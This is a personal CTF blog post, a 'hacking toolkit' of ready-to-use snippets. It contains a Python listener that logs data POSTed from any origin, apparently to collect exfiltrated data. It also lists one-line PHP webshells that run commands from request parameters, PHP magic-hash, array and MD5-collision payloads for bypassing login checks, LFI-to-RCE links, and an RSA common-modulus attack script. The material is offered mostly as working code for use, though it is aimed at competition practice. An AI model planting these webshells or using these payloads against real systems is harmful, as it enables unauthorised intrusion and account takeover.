---
abbrlink: 4e56d65
categories:
    - - Hacking
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/9/Blog_cover%20(17)%20(1)_3e1f0c91c61253af1f2670f4341e7d33.jpg
date: "2024-09-03T23:50:41.047232+08:00"
sticky: 1337
tags: CTF
title: My Hacking Toolkit
updated: "2024-09-04T16:33:10.514+08:00"
---

# Web

## Temp Server (Python)

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

## One-liner Trojan (Backdoor, Webshell)

```php
<?php @eval($_POST['shell']);?>
<?php @system($_POST["cmd"])?>
<?php passthru($_GET['cmd']); ?>
<? system($_GET["cmd"]); ?>
```



## LFI & RFI

### LFI2RCE

-   [Advanced Local File Inclusion to RCE in 2022](https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/)
-   [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/CX330Blake/PHP_INCLUDE_TO_SHELL_CHAR_DICT)

## PHP Hash Bypass

### Scientific Notation

#### Numbers

```txt
240610708 0e462097431906509019562988736854 
314282422 0e990995504821699494520356953734 
571579406 0e972379832854295224118025748221 
903251147 0e174510503823932942361353209384 
1110242161 0e435874558488625891324861198103 
1320830526 0e912095958985483346995414060832 
1586264293 0e622743671155995737639662718498 
2302756269 0e250566888497473798724426794462 
2427435592 0e067696952328669732475498472343 
2653531602 0e877487522341544758028810610885 
3293867441 0e471001201303602543921144570260 
3295421201 0e703870333002232681239618856220 
3465814713 0e258631645650999664521705537122 
3524854780 0e507419062489887827087815735195 
3908336290 0e807624498959190415881248245271 
4011627063 0e485805687034439905938362701775 
4775635065 0e998212089946640967599450361168 
4790555361 0e643442214660994430134492464512 
5432453531 0e512318699085881630861890526097 
5579679820 0e877622011730221803461740184915 
5585393579 0e664357355382305805992765337023 
6376552501 0e165886706997482187870215578015
7124129977 0e500007361044747804682122060876 
7197546197 0e915188576072469101457315675502 
7656486157 0e451569119711843337267091732412
```

#### String

```txt
aaaXXAYW 0e540853622400160407992788832284 
aabg7XSs 0e087386482136013740957780965295 
aabC9RqS 0e041022518165728065344349536299
```

#### Original Scientific Notation

```txt
0e215962017 0e291242476940776845150308577824
```

### Array

In PHP, the default argument of the `md5()` function is string, when the argument is an array, the function will return `null`. 

```txt
?user[]=1&pass[]=1
```

### Collision

```txt
user=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP pass=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP
```

### Others (References)

- [PHP MD5 Bypass Trick](https://qftm.github.io/2020/08/23/php-md5-bypass-audit/#toc-heading-26)
- [[CTF]CTF中if (md5(md5(\$\_GET[‘a’])) == md5(\$\_GET[‘b’])) 的绕过](https://blog.csdn.net/baguangman5501/article/details/102031546)

# Crypto

## Common Modulus Attack

```python
from Crypto.Util.number import long_to_bytes

n = 8043524339665486501722690364841854181558012095441297536641336786057021881436981279151373985115124256457664918399612791182378270114245970486016546496099141
e1 = 863047
c1 = 977794351462943753500623403456170325029164798178157637276767524847451843872628142596652557213651039320937257524442343930998122764638359874102209638080782
e2 = 995023
c2 = 7803335784329682230086969003344860669091120072205053582211253806085013270674227310898253029435120218230585288142781999838242977459669454181592089356383378


def egcd(a: int, b: int) -> tuple[int, int, int]:
    if a == 0:
        return (b, 0, 1)
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)


def inverse(a: int, b: int) -> int:
    g, x, y = egcd(a, b)  # ax + by = g
    if g == 1:
        return x % b
    raise ValueError("base is not invertible for the given modulus.")


g, x, y = egcd(e1, e2)

if x < 0:
    c1_inv = inverse(c1, n)
    c1 = pow(c1_inv, -x, n)
else:
    c1 = pow(c1, x, n)

if y < 0:
    c2_inv = inverse(c2, n)
    c2 = pow(c2_inv, -y, n)
else:
    c2 = pow(c2, y, n)

m = (c1 * c2) % n
print(long_to_bytes(m))
```

## Hash Collision

-   [Hash Collisions](https://github.com/CX330Blake/Hash-Collisions/)
